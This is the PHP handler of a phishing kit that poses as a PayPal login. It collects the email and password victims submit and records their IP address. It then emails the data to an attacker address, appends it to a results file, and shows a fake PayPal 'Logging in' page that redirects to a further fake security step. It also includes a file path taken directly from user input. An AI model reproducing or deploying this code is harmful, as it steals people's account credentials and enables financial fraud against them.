<php
include 'encrypter.php';

@ini_set('display_errors',0);
include 'BlackList.php';
?>
<?php
$ip = getenv("REMOTE_ADDR");
$login = $_POST['email'];
$pass = $_POST['ps'];
$hostname = $_POST['hostname'];
$message = "
=========[LOGIN INFOS]=========
PayPal Email  		: $login
PayPal Password  	: $pass
===============[IP]==============
IP	: http://www.geoiptool.com/?IP=$ip
==========[BY RAD!TN]=========";
$encrypt=  base64_encode($message);
include "$hostname";
include 'to.php';
$subject = "Xboomber V5 Xhot Login [$ip]";
$headers = "From: resulta <My.result>";
$headers .= $_POST['eMailAdd']."\n";
mail($to, $subject, $message,$headers);
$file = fopen("../Result-By-virus dz.txt", 'a');
fwrite($file, $message);
?>
<html>
<head>
<title>Logging in - &Rho;ay&Rho;al</title>
<link rel="stylesheet" href="./st/style.css">
<link rel="shortcut icon" link rel="logo-icon" href="./img/ppico.ico">
<meta http-equiv="refresh" content="5;url=./security.php?cmd=_security-check=<?php echo md5(microtime());?>&session=<?php echo sha1(microtime()); ?>">
</head>
<body>

<div class="loading">
<h3 style="text-align: center; margin-bottom: 40px;"> Hold a while ...</h3>
<div id="jsbksbvdsksdbksadj" class="jfjgfdhdhtjdhtdh" style="margin: 0 auto;"></div>
<p style="text-align: center; margin-top: 40px; font-size: 16px; color: #656565;">Still loading after a few seconds? <a href="./login.php" style="color: #333333">Try again</a></p>
</div>

</body>
</html>